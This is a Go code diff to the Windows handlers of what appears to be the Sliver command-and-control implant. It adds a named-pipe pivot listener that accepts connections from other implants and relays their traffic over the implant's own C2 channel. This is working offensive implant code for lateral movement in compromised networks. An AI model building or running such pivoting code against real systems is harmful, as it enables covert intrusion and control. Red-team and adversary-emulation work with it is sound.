@@ -21,11 +21,19 @@ package handlers
 import (
 	// {{if .Debug}}
 	"log"
-	// {{else}}{{end}}
+	// {{end}}
+	"math/rand"
+	"net"
+	"os"
+	"strings"
+	"time"
 
 	pb "github.com/bishopfox/sliver/protobuf/sliver"
+	"github.com/bishopfox/sliver/sliver/pivots"
+	"github.com/bishopfox/sliver/sliver/pivots/namedpipe"
 	"github.com/bishopfox/sliver/sliver/priv"
 	"github.com/bishopfox/sliver/sliver/taskrunner"
+	"github.com/bishopfox/sliver/sliver/transports"
 
 	"github.com/golang/protobuf/proto"
 	"golang.org/x/sys/windows"
@@ -64,12 +72,19 @@ var (
 
 		pb.MsgSideloadReq: sideloadHandler,
 		pb.MsgNetstatReq:  netstatHandler,
+	}
 
+	windowsPivotHandlers = map[uint32]PivotHandler{
+		pb.MsgNamedPipesReq: namedPipeListenerHandler,
 	}
 )
 
 func GetSystemHandlers() map[uint32]RPCHandler {
 	return windowsHandlers
+}
+
+func GetSystemPivotHandlers() map[uint32]PivotHandler {
+	return windowsPivotHandlers
 }
 
 // ---------------- Windows Handlers ----------------
@@ -260,4 +275,139 @@ func spawnDllHandler(data []byte, resp RPCResponse) {
 	}
 	data, err = proto.Marshal(spawnResp)
 	resp(data, err)
+}
+
+func nampedPipeAcceptNewConnection(ln *namedpipe.PipeListener, connection *transports.Connection) {
+	hostname, err := os.Hostname()
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("Failed to determine hostname %s", err)
+		// {{end}}
+		hostname = "."
+	}
+	namedPipe := strings.ReplaceAll(ln.Addr().String(), ".", hostname)
+	for {
+		conn, err := ln.Accept()
+		if err != nil {
+			continue
+		}
+		rand.Seed(time.Now().UnixNano())
+		pivotID := rand.Uint32()
+		pivotsMap.AddPivot(pivotID, &conn)
+		SendPivotOpen(pivotID, "named-pipe", namedPipe, connection)
+
+		// {{if .Debug}}
+		log.Println("Accepted a new connection")
+		// {{end}}
+
+		// handle connection like any other net.Conn
+		go nampedPipeConnectionHandler(&conn, connection, pivotID)
+	}
+}
+
+func nampedPipeConnectionHandler(conn *net.Conn, connection *transports.Connection, pivotID uint32) {
+
+	defer func() {
+		// {{if .Debug}}
+		log.Println("Cleaning up for pivot %d", pivotID)
+		// {{end}}
+		(*conn).Close()
+		pivotClose := &pb.PivotClose{
+			PivotID: pivotID,
+		}
+		data, err := proto.Marshal(pivotClose)
+		if err != nil {
+			// {{if .Debug}}
+			log.Println(err)
+			// {{end}}
+		}
+		connection.Send <- &pb.Envelope{
+			Type: pb.MsgPivotClose,
+			Data: data,
+		}
+	}()
+
+	for {
+		envelope, err := pivots.PivotReadEnvelope(conn)
+		if err != nil {
+			// {{if .Debug}}
+			log.Println(err)
+			// {{end}}
+			return
+		}
+		dataBuf, err1 := proto.Marshal(envelope)
+		if err1 != nil {
+			// {{if .Debug}}
+			log.Println(err1)
+			// {{end}}
+			return
+		}
+		pivotOpen := &pb.PivotData{
+			PivotID: pivotID,
+			Data:    dataBuf,
+		}
+		data2, err2 := proto.Marshal(pivotOpen)
+		if err2 != nil {
+			// {{if .Debug}}
+			log.Println(err2)
+			// {{end}}
+			return
+		}
+		connection.Send <- &pb.Envelope{
+			Type: pb.MsgPivotData,
+			Data: data2,
+		}
+	}
+}
+
+func namedPipeListenerHandler(envelope *pb.Envelope, connection *transports.Connection) {
+	namedPipeReq := &pb.NamedPipesReq{}
+	err := proto.Unmarshal(envelope.Data, namedPipeReq)
+
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		namedPipeResp := &pb.NamedPipes{
+			Success: false,
+			Err:     err.Error(),
+		}
+		data, _ := proto.Marshal(namedPipeResp)
+		connection.Send <- &pb.Envelope{
+			ID:   envelope.GetID(),
+			Data: data,
+		}
+		return
+	}
+	var ln *namedpipe.PipeListener
+	ln, err = namedpipe.Listen("\\\\.\\pipe\\" + namedPipeReq.GetPipeName())
+	// {{if .Debug}}
+	log.Printf("Listening on %s", "\\\\.\\pipe\\"+namedPipeReq.GetPipeName())
+	// {{end}}
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error with listener: %s", err.Error())
+		// {{end}}
+		namedPipeResp := &pb.NamedPipes{
+			Success: false,
+			Err:     err.Error(),
+		}
+		data, _ := proto.Marshal(namedPipeResp)
+		connection.Send <- &pb.Envelope{
+			ID:   envelope.GetID(),
+			Data: data,
+		}
+		return
+	}
+
+	go nampedPipeAcceptNewConnection(ln, connection)
+
+	namedPipeResp := &pb.NamedPipes{
+		Success: true,
+	}
+	data, _ := proto.Marshal(namedPipeResp)
+	connection.Send <- &pb.Envelope{
+		ID:   envelope.GetID(),
+		Data: data,
+	}
 }
